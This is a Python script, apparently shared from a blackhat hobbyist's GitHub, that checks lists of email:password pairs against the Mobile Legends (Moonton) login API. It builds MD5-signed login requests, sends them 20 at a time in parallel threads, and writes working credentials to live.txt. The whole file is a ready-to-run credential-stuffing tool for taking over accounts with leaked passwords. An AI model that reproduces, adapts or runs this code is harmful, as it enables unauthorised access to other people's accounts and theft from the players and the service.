# coding=utf-8

###########################################################################
# Name           : Moonton Account Checker                                #
# File           : cek.py                                                 #
# Author         : Adit Arlos                                             #
# Github         : https://github.com/aditarlos                           #
# youtube        : Newbie_Tersakiti.                                      #
# Python version : 2.7 OR 3.7++                                           #
# url chanell    :https://www.youtube.com/channel/UCnRTrkz70slyAN80aRb0irQ#
###########################################################################

import os, sys, hashlib, json

try:
  from concurrent.futures import ThreadPoolExecutor
except ImportError:
  if sys.version_info.major != 2:
    os.system('pip install futures')
    exit('Please restart this tools')
  else:
    os.system('pip2 install futures')
    exit('Please restart this tools')
try:
  import requests
except ImportError:
  if sys.version_info.major != 2:
    os.system('pip install requests')
    exit('Please restart this tools')
  else:
    os.system('pip2 install requests')
    exit('Please restart this tools')

api = 'https://accountmtapi.mobilelegends.com/'

class MOONTON:
  def __init__(self, url):
    self.userdata = []
    self.live = []
    self.die = []
    self.api = url
    print('''\033[0m

|V| _  _ __ _|_ _ __    /  |_  _  _  |  _  __
| |(_)(_)| | |_(_)| |   \__| |(/_(_  |<(/_ |
---------------------------------------------
          - Created By (Acep X-Code) -
---------------------------------------------
[#] TKJ Blackhat\n''')

  def main(self):
    print('[!] Pemisah email:password atau email|password\n')
    if sys.version_info.major != 2:
      empas = input('[?] List empas (ex: list.txt): ')
    else:
      empas = raw_input('[?] List empas (ex: list.txt): ')
    if os.path.exists(empas):
      for data in open(empas,'r').readlines():
        try:
          user = data.strip().split('|')
          if user[0] and user[1]:
            self.userdata.append({
              'email': user[0],
              'pw': user[1],
              'userdata': data.strip()
            })
        except IndexError:
          try:
            user = data.strip().split(':')
            if user[0] and user[1]:
              self.userdata.append({
                'email': user[0],
                'pw': user[1],
                'userdata': data.strip()
             })
          except: pass
      if len(self.userdata) == 0:
        exit('[!] Empas tidak ada atau tidak valid pastikan berformat email:pass atau email|pass')
      print('[*] Total {0} account\n'.format(str(len(self.userdata))))
      with ThreadPoolExecutor(max_workers=20) as thread:
        [thread.submit(self.validate, user) for user in self.userdata]
      print('\n[#] LIVE: '+str(len(self.live))+' - saved: live.txt')
      print('[#] DIEE: '+str(len(self.die))+' - saved: die.txt')
      exit(0)
    else:
      print('[!] File tidak ditemukan "{0}"'.format(empas))

  def hash_md5(self, string):
    md5 = hashlib.new('md5')
    md5.update(string.encode('utf-8'))
    return md5.hexdigest()

  def build_params(self, user):
    md5pwd = self.hash_md5(user['pw'])
    hashed = self.hash_md5('account={0}&md5pwd={1}&op=login'.format(user['email'], md5pwd))
    return json.dumps({
      'op': 'login',
      'sign': hashed,
      'params': {
        'account': user['email'],
        'md5pwd': md5pwd,
      },
      'lang': 'cn'
    })

  def validate(self, user):
    try:
      data = self.build_params(user)
      response = requests.post(self.api, data=data).json()
      if response['message'] == 'Error_Success':
        print('\r[\033[92mLIVE\033[0m] '+user['userdata'])
        self.live.append(user['userdata'])
        open('live.txt','a').write(str(user['userdata'])+'\n')
      else:
        print('\r[\033[91mDIEE\033[0m] '+user['userdata'])
        self.die.append(user['userdata'])
        open('die.txt','a').write(str(user['userdata'])+'\n')
    except:
      self.validate(user)

if __name__ == '__main__':
  (MOONTON(api).main())